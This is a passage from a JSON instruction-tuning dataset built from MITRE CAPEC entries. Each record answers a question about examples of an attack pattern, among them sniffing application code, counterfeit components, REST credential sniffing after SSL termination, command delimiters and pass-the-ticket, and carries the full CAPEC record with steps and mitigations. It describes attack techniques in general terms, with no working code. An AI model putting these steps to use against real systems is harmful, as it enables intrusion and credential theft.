              "@CWE_ID": "354"
            },
            {
              "@CWE_ID": "696"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-400"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Example_Instances, Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Sniff Application Code (CAPEC ID: 65)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: Attacker receives notification that the computer/OS/application has an available update, loads a network sniffing tool, and extracts update data from subsequent communication. The attacker then proceeds to reverse engineer the captured stream to gain sensitive information, such as encryption keys, validation algorithms, applications patches, etc..\n- Plain code, such as applets or JavaScript, is also part of the executing application. If such code is transmitted unprotected, the attacker can capture the code and possibly reverse engineer it to gain sensitive information, such as encryption keys, validation algorithms and such.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Attacker receives notification that the computer/OS/application has an available update, loads a network sniffing tool, and extracts update data from subsequent communication. The attacker then proceeds to reverse engineer the captured stream to gain sensitive information, such as encryption keys, validation algorithms, applications patches, etc..",
        "Plain code, such as applets or JavaScript, is also part of the executing application. If such code is transmitted unprotected, the attacker can capture the code and possibly reverse engineer it to gain sensitive information, such as encryption keys, validation algorithms and such."
      ],
      "@Name": "Sniff Application Code (CAPEC ID: 65)",
      "attack_ptrn": {
        "@ID": "65",
        "@Name": "Sniff Application Code",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary passively sniffs network communications and captures application code bound for an authorized client. Once obtained, they can use it as-is, or through reverse-engineering glean sensitive information or exploit the trust relationship between the client and server. Such code may belong to a dynamic update to the client, a patch being applied to a client component or any such interaction where the client is authorized to communicate with the server.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "157"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "37"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Set up a sniffer] The adversary sets up a sniffer in the path between the server and the client and watches the traffic.",
              "Technique": "The adversary sets up a sniffer in the path between the server and the client."
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "[Capturing Application Code Bound During Patching]adversary knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The adversary loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The adversary then proceeds to reverse engineer the captured code.",
              "Technique": [
                "adversary loads the sniffer to capture the application code bound during a dynamic update.",
                "The adversary proceeds to reverse engineer the captured code."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The attacker must have the ability to place themself in the communication path between the client and server.",
            "The targeted application must receive some application code from the server; for example, dynamic updates, patches, applets or scripts.",
            "The attacker must be able to employ a sniffer on the network without being detected."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The attacker needs to setup a sniffer for a sufficient period of time so as to capture meaningful quantities of code. The presence of the sniffer should not be detected on the network. Also if the attacker plans to employ an adversary-in-the-middle attack (CAPEC-94), the client or server must not realize this. Finally, the attacker needs to regenerate source code from binary code if the need be."
          }
        },
        "Resources_Required": {
          "Resource": {
            "xhtml:p": [
              "The Attacker needs the ability to capture communications between the client being updated and the server providing the update.",
              "In the case that encryption obscures client/server communication the attacker will either need to lift key material from the client."
            ]
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Encrypt all communication between the client and server.",
            "Implementation: Use SSL, SSH, SCP.",
            "Operation: Use \"ifconfig/ipconfig\" or other tools to detect the sniffer installed in the network."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Attacker receives notification that the computer/OS/application has an available update, loads a network sniffing tool, and extracts update data from subsequent communication. The attacker then proceeds to reverse engineer the captured stream to gain sensitive information, such as encryption keys, validation algorithms, applications patches, etc..",
            "Plain code, such as applets or JavaScript, is also part of the executing application. If such code is transmitted unprotected, the attacker can capture the code and possibly reverse engineer it to gain sensitive information, such as encryption keys, validation algorithms and such."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "319"
            },
            {
              "@CWE_ID": "311"
            },
            {
              "@CWE_ID": "318"
            },
            {
              "@CWE_ID": "693"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1040",
            "Entry_Name": "Network Sniffing"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Description Summary, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Prerequisites"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-12-07",
            "#text": "Passively Sniff and Capture Application Code Bound for Authorized Client"
          }
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Provide Counterfeit Component (CAPEC ID: 530)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: The attacker, aware that the victim has contracted with an integrator for system maintenance and that the integrator uses commercial-off-the-shelf network hubs, develops their own network hubs with a built-in malicious capability for remote access, the malicious network hubs appear to be a well-known brand of network hub but are not. The attacker then advertises to the sub-system integrator that they are a legit supplier of network hubs, and offers them at a reduced price to entice the integrator to purchase these network hubs. The integrator then installs the attacker's hubs at the victim's location, allowing the attacker to remotely compromise the victim's network.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "The attacker, aware that the victim has contracted with an integrator for system maintenance and that the integrator uses commercial-off-the-shelf network hubs, develops their own network hubs with a built-in malicious capability for remote access, the malicious network hubs appear to be a well-known brand of network hub but are not. The attacker then advertises to the sub-system integrator that they are a legit supplier of network hubs, and offers them at a reduced price to entice the integrator to purchase these network hubs. The integrator then installs the attacker's hubs at the victim's location, allowing the attacker to remotely compromise the victim's network.",
      "@Name": "Provide Counterfeit Component (CAPEC ID: 530)",
      "attack_ptrn": {
        "@ID": "530",
        "@Name": "Provide Counterfeit Component",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker provides a counterfeit component during the procurement process of a lower-tier component supplier to a sub-system developer or integrator, which is then built into the system being upgraded or repaired by the victim, allowing the attacker to cause disruption or additional compromise.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "531"
          }
        },
        "Prerequisites": {
          "Prerequisite": "Advanced knowledge about the target system and sub-components."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Able to develop and manufacture malicious system components that resemble legitimate name-brand components."
          }
        },
        "Mitigations": {
          "Mitigation": "There are various methods to detect if the component is a counterfeit. See section II of [REF-703] for many techniques."
        },
        "Example_Instances": {
          "Example": "The attacker, aware that the victim has contracted with an integrator for system maintenance and that the integrator uses commercial-off-the-shelf network hubs, develops their own network hubs with a built-in malicious capability for remote access, the malicious network hubs appear to be a well-known brand of network hub but are not. The attacker then advertises to the sub-system integrator that they are a legit supplier of network hubs, and offers them at a reduced price to entice the integrator to purchase these network hubs. The integrator then installs the attacker's hubs at the victim's location, allowing the attacker to remotely compromise the victim's network."
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-439"
            },
            {
              "@External_Reference_ID": "REF-698"
            },
            {
              "@External_Reference_ID": "REF-703"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Mitigations, References"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-11-09",
            "#text": "Counterfeit Component Supplied"
          }
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Utilizing REST's Trust in the System Resource to Obtain Sensitive Data (CAPEC ID: 57)",
    "context": "",
    "output": "Possible examples: The Rest service provider uses SSL to protect the communications between the service requester (client) to the service provider. In the instance where SSL is terminated before the communications reach the web server, it is very common in enterprise data centers to terminate SSL at a router, firewall, load balancer, proxy or other device, then the adversary can insert a sniffer into the communication stream and gather all the authentication tokens (such as session credentials, username/passwords combinations, and so on). The Rest service requester and service provider do not have any way to detect this attack.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "The Rest service provider uses SSL to protect the communications between the service requester (client) to the service provider. In the instance where SSL is terminated before the communications reach the web server, it is very common in enterprise data centers to terminate SSL at a router, firewall, load balancer, proxy or other device, then the adversary can insert a sniffer into the communication stream and gather all the authentication tokens (such as session credentials, username/passwords combinations, and so on). The Rest service requester and service provider do not have any way to detect this attack.",
      "@Name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data (CAPEC ID: 57)",
      "attack_ptrn": {
        "@ID": "57",
        "@Name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This attack utilizes a REST(REpresentational State Transfer)-style applications' trust in the system resources and environment to obtain sensitive data once SSL is terminated.",
        "Extended_Description": {
          "xhtml:p": [
            "Rest applications premise is that they leverage existing infrastructure to deliver web services functionality. An example of this is a Rest application that uses HTTP Get methods and receives a HTTP response with an XML document. These Rest style web services are deployed on existing infrastructure such as Apache and IIS web servers with no SOAP stack required.",
            "Unfortunately from a security standpoint, there frequently is no interoperable identity security mechanism deployed, so Rest developers often fall back to SSL to deliver security. In large data centers, SSL is typically terminated at the edge of the network - at the firewall, load balancer, or router. Once the SSL is terminated the HTTP request is in the clear (unless developers have hashed or encrypted the values, but this is rare). The adversary can utilize a sniffer such as Wireshark to snapshot the credentials, such as username and password that are passed in the clear once SSL is terminated. Once the adversary gathers these credentials, they can submit requests to the web service provider just as authorized user do. There is not typically an authentication on the client side, beyond what is passed in the request itself so once this is compromised, then this is generally sufficient to compromise the service's authentication scheme."
          ]
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "157"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Find a REST-style application that uses SSL] The adversary must first find a REST-style application that uses SSL to target. Because this attack is easier to carry out from inside of a server network, it is likely that an adversary could have inside knowledge of how services operate."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Insert a listener to sniff client-server communication] The adversary inserts a listener that must exist beyond the point where SSL is terminated. This can be placed on the client side if it is believed that sensitive information is being sent to the client as a response, although most often the listener will be placed on the server side to listen for client authentication information.",
              "Technique": "Run wireshark or tcpdump on a device that is on the inside of a firewall, load balancer, or router of a network and capture traffic after SSL has been terminated"
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Gather information passed in the clear] If developers have not hashed or encrypted data sent in the sniffed request, the adversary will be able to read this data in the clear. Most commonly, they will now have a username or password that they can use to submit requests to the web service just as an authorized user"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Opportunity to intercept must exist beyond the point where SSL is terminated.",
            "The adversary must be able to insert a listener actively (proxying the communication) or passively (sniffing the communication) in the client-server communication path."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "To insert a network sniffer or other listener into the communication stream"
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Access Control",
              "Authorization"
            ],
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Implementation: Implement message level security such as HMAC in the HTTP communication",
            "Design: Utilize defense in depth, do not rely on a single security mechanism like SSL",
            "Design: Enforce principle of least privilege"
          ]
        },
        "Example_Instances": {
          "Example": "The Rest service provider uses SSL to protect the communications between the service requester (client) to the service provider. In the instance where SSL is terminated before the communications reach the web server, it is very common in enterprise data centers to terminate SSL at a router, firewall, load balancer, proxy or other device, then the adversary can insert a sniffer into the communication stream and gather all the authentication tokens (such as session credentials, username/passwords combinations, and so on). The Rest service requester and service provider do not have any way to detect this attack."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "300"
            },
            {
              "@CWE_ID": "287"
            },
            {
              "@CWE_ID": "693"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1040",
            "Entry_Name": "Network Sniffing"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated @Name, Description, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Example_Instances, Extended_Description, Prerequisites"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2019-09-30",
            "#text": "Utilizing REST's Trust in the System Resource to Register Man in the Middle"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: DNS Domain Seizure (CAPEC ID: 585), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: The FBI's seizure of gambling websites, the US DOJ's seizure of child pornography websites, and Microsoft's seizure of all domains owned by the company No-IP in order to disrupt a cyberattack originating from a subset of those domains.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "The FBI's seizure of gambling websites, the US DOJ's seizure of child pornography websites, and Microsoft's seizure of all domains owned by the company No-IP in order to disrupt a cyberattack originating from a subset of those domains.",
      "@Name": "DNS Domain Seizure (CAPEC ID: 585)",
      "attack_ptrn": {
        "@ID": "585",
        "@Name": "DNS Domain Seizure",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "In this attack pattern, an adversary influences a target's web-hosting company to disable a target domain. The goal is to prevent access to the targeted service provided by that domain. It usually occurs as the result of civil or criminal legal interventions.",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "582",
            "Exclude_Related": [
              {
                "@Exclude_ID": "513"
              },
              {
                "@Exclude_ID": "514"
              },
              {
                "@Exclude_ID": "512"
              },
              {
                "@Exclude_ID": "515"
              }
            ]
          }
        },
        "Prerequisites": {
          "Prerequisite": "This attack pattern requires that the adversary has cooperation from the registrar of the target domain."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Availability",
            "Impact": "Other",
            "Note": "Disabling a target domain at the infrastructure level denies the availability of its service to the user."
          }
        },
        "Example_Instances": {
          "Example": "The FBI's seizure of gambling websites, the US DOJ's seizure of child pornography websites, and Microsoft's seizure of all domains owned by the company No-IP in order to disrupt a cyberattack originating from a subset of those domains."
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-467"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "Seamus Tuohy",
            "Submission_Date": "2017-01-12"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Command Delimiters (CAPEC ID: 15)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: By appending special characters, such as a semicolon or other commands that are executed by the target process, the attacker is able to execute a wide variety of malicious commands in the target process space, utilizing the target's inherited permissions, against any resource the host has access to. The possibilities are vast including injection attacks against RDBMS (SQL Injection), directory servers (LDAP Injection), XML documents (XPath and XQuery Injection), and command line shells. In many injection attacks, the results are converted back to strings and displayed to the client process such as a web browser without tripping any security alarms, so the network firewall does not log any out of the ordinary behavior.\nLDAP servers house critical identity assets such as user, profile, password, and group information that is used to authenticate and authorize users. An attacker that can query the directory at will and execute custom commands against the directory server is literally working with the keys to the kingdom in many enterprises. When user, organizational units, and other directory objects are queried by building the query string directly from user input with no validation, or other conversion, then the attacker has the ability to use any LDAP commands to query, filter, list, and crawl against the LDAP server directly in the same manner as SQL injection gives the ability to the attacker to run SQL commands on the database.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "By appending special characters, such as a semicolon or other commands that are executed by the target process, the attacker is able to execute a wide variety of malicious commands in the target process space, utilizing the target's inherited permissions, against any resource the host has access to. The possibilities are vast including injection attacks against RDBMS (SQL Injection), directory servers (LDAP Injection), XML documents (XPath and XQuery Injection), and command line shells. In many injection attacks, the results are converted back to strings and displayed to the client process such as a web browser without tripping any security alarms, so the network firewall does not log any out of the ordinary behavior.",
        "LDAP servers house critical identity assets such as user, profile, password, and group information that is used to authenticate and authorize users. An attacker that can query the directory at will and execute custom commands against the directory server is literally working with the keys to the kingdom in many enterprises. When user, organizational units, and other directory objects are queried by building the query string directly from user input with no validation, or other conversion, then the attacker has the ability to use any LDAP commands to query, filter, list, and crawl against the LDAP server directly in the same manner as SQL injection gives the ability to the attacker to run SQL commands on the database."
      ],
      "@Name": "Command Delimiters (CAPEC ID: 15)",
      "attack_ptrn": {
        "@ID": "15",
        "@Name": "Command Delimiters",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attack of this type exploits a programs' vulnerabilities that allows an attacker's commands to be concatenated onto a legitimate command with the intent of targeting other resources such as the file system or database. The system that uses a filter or denylist input validation, as opposed to allowlist validation is vulnerable to an attacker who predicts delimiters (or combinations of delimiters) not present in the filter or denylist. As with other injection attacks, the attacker uses the command delimiter payload as an entry point to tunnel through the application and activate additional attacks through SQL queries, shell commands, network scanning, and so on.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "137",
            "Exclude_Related": {
              "@Exclude_ID": "403"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Assess Target Runtime Environment] In situations where the runtime environment is not implicitly known, the attacker makes connections to the target system and tries to determine the system's runtime environment. Knowing the environment is vital to choosing the correct delimiters.",
              "Technique": [
                "Port mapping using network connection-based software (e.g., nmap, nessus, etc.)",
                "Port mapping by exploring the operating system (netstat, sockstat, etc.)",
                "TCP/IP Fingerprinting",
                "Induce errors to find informative error messages"
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Survey the Application] The attacker surveys the target application, possibly as a valid and authenticated user",
              "Technique": [
                "Spidering web sites for all available links",
                "Inventory all application inputs"
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Attempt delimiters in inputs] The attacker systematically attempts variations of delimiters on known inputs, observing the application's response each time.",
              "Technique": [
                "Inject command delimiters using network packet injection tools (netcat, nemesis, etc.)",
                "Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.)",
                "Enter command delimiters directly in input fields."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Use malicious command delimiters] The attacker uses combinations of payload and carefully placed command delimiters to attack the software."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Software's input validation or filtering must not detect and block presence of additional malicious command."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The attacker has to identify injection vector, identify the specific commands, and optionally collect the output, i.e. from an interactive session."
          }
        },
        "Resources_Required": {
          "Resource": "Ability to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Perform allowlist validation against a positive specification for command length, type, and parameters.",
            "Design: Limit program privileges, so if commands circumvent program input validation or filter routines then commands do not running under a privileged account",
            "Implementation: Perform input validation for all remote content.",
            "Implementation: Use type conversions such as JDBC prepared statements."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "By appending special characters, such as a semicolon or other commands that are executed by the target process, the attacker is able to execute a wide variety of malicious commands in the target process space, utilizing the target's inherited permissions, against any resource the host has access to. The possibilities are vast including injection attacks against RDBMS (SQL Injection), directory servers (LDAP Injection), XML documents (XPath and XQuery Injection), and command line shells. In many injection attacks, the results are converted back to strings and displayed to the client process such as a web browser without tripping any security alarms, so the network firewall does not log any out of the ordinary behavior.",
              "LDAP servers house critical identity assets such as user, profile, password, and group information that is used to authenticate and authorize users. An attacker that can query the directory at will and execute custom commands against the directory server is literally working with the keys to the kingdom in many enterprises. When user, organizational units, and other directory objects are queried by building the query string directly from user input with no validation, or other conversion, then the attacker has the ability to use any LDAP commands to query, filter, list, and crawl against the LDAP server directly in the same manner as SQL injection gives the ability to the attacker to run SQL commands on the database."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "146"
            },
            {
              "@CWE_ID": "77"
            },
            {
              "@CWE_ID": "184"
            },
            {
              "@CWE_ID": "78"
            },
            {
              "@CWE_ID": "185"
            },
            {
              "@CWE_ID": "93"
            },
            {
              "@CWE_ID": "140"
            },
            {
              "@CWE_ID": "157"
            },
            {
              "@CWE_ID": "138"
            },
            {
              "@CWE_ID": "154"
            },
            {
              "@CWE_ID": "697"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Use of Captured Tickets (Pass The Ticket) (CAPEC ID: 645)",
    "context": "",
    "output": "Possible examples: Bronze Butler (also known as Tick), has been shown to leverage forged Kerberos Ticket Granting Tickets (TGTs) and Ticket Granting Service (TGS) tickets to maintain administrative access on a number of systems. [REF-584]",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Bronze Butler (also known as Tick), has been shown to leverage forged Kerberos Ticket Granting Tickets (TGTs) and Ticket Granting Service (TGS) tickets to maintain administrative access on a number of systems. [REF-584]",
      "@Name": "Use of Captured Tickets (Pass The Ticket) (CAPEC ID: 645)",
      "attack_ptrn": {
        "@ID": "645",
        "@Name": "Use of Captured Tickets (Pass The Ticket)",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary uses stolen Kerberos tickets to access systems/resources that leverage the Kerberos authentication protocol. The Kerberos authentication protocol centers around a ticketing system which is used to request/grant access to services and to then access the requested services. An adversary can obtain any one of these tickets (e.g. Service Ticket, Ticket Granting Ticket, Silver Ticket, or Golden Ticket) to authenticate to a system/resource without needing the account's credentials. Depending on the ticket obtained, the adversary may be able to access a particular resource or generate TGTs for any account within an Active Directory Domain.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "652"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The adversary needs physical access to the victim system.",
            "The use of a third-party credential harvesting tool."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "Determine if Kerberos authentication is used on the server."
            },
            {
              "@Level": "High",
              "#text": "The adversary uses a third-party tool to obtain the necessary tickets to execute the attack."
            }
          ]
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Integrity",
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Reset the built-in KRBTGT account password twice to invalidate the existence of any current Golden Tickets and any tickets derived from them.",
            "Monitor system and domain logs for abnormal access."
          ]
        },
        "Example_Instances": {
          "Example": "Bronze Butler (also known as Tick), has been shown to leverage forged Kerberos Ticket Granting Tickets (TGTs) and Ticket Granting Service (TGS) tickets to maintain administrative access on a number of systems. [REF-584]"
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "522"
            },
            {
              "@CWE_ID": "294"
            },
            {
              "@CWE_ID": "308"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1550.003",
            "Entry_Name": "Use Alternate Authentication Material:Pass The Ticket"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-584"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Date": "2018-07-31"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2020-07-30",
            "Modification_Comment": "Updated Description, Example_Instances, References, Related_Attack_Patterns, Related_Weaknesses, Taxonomy_Mappings"
          }
        }
      }
    }
  },
  {
